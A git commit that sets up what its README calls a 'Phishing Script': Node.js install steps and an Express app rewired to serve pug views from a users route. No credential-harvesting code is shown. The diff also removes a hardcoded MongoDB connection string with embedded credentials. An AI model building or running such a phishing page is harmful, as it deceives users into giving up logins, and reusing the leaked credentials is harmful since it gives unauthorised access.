e8bdb03963ec6527ede2669e10405b2fb0f51cf5
Mouseinc <vicjuma945@gmail.com>
2020-12-29 14:04:13 +0300

    phishing pange

---
+++ README.md
@@ -0,0 +1,22 @@
+# Running the Phishing Script
+
+## Install Node.js and NPM
+
+ **Linux** - use the package manager for linux as root - *sudo apt
+ install nodejs* (comes packaged with npm)
+
+ Download the deb file then run as root - dpkg -i name.deb
+ on the folder the file is downloaded
+
+## Perform global installation of nodemon
+
+ npm install -g nodemon
+
+## Ensure all npm modules are present
+
+ npm install or yarn
+
+## Kickstart the application
+
+ 1. *nodemon*
+ 2. *node server.js*
--- app.js
+++ app.js
@@ -1,36 +1,22 @@
 const express = require('express');
+const pug = require('pug');
 const logger = require('morgan');
-const bodyParser = require('body-parser');  
-const mongoose = require('mongoose');                                                                                                                                                              
-const prodRoute = require('./api/routes/products');
-const orderRoute = require('./api/routes/orders');
+const bodyParser = require('body-parser');                                                                                                                                                             
 const userRoute = require('./api/routes/users');
 const app = express();
 const cors = require('cors');
 const path = require('path');
 
-// mongodb://myUserName:MyPassword@ElasticIP:27017/databaseName?authSource=admin
-
-mongoose.connect(`mongodb+srv://vik:vik@rest-0wmlu.mongodb.net/test?authSource=admin?retryWrites=true&w=majority`, { useNewUrlParser: true }).then(() => {
-  console.log('connected to the database')
-}).catch(err => console.log('could not connect to the database', err));
-
 app.use(cors());
 app.use(logger('dev'));
 app.use(bodyParser.urlencoded({extended:false}));
 app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, '/uploads')));
 app.use(express.static(path.join('public')));
+app.set('view engine', 'pug');
+app.set('views', __dirname + '/views');
 
-app.use('/products', prodRoute);
-app.use('/orders', orderRoute);
-app.use('/api/users', userRoute);
+app.use('/', userRoute);
 
-app.get('/', (req, res) => {
-  res.sendFile('index.html', () => {
-    console.log('sent');
-  });
-});
 
 app.use((req,res,next) => {
   const error = new Error('NOT FOUND');
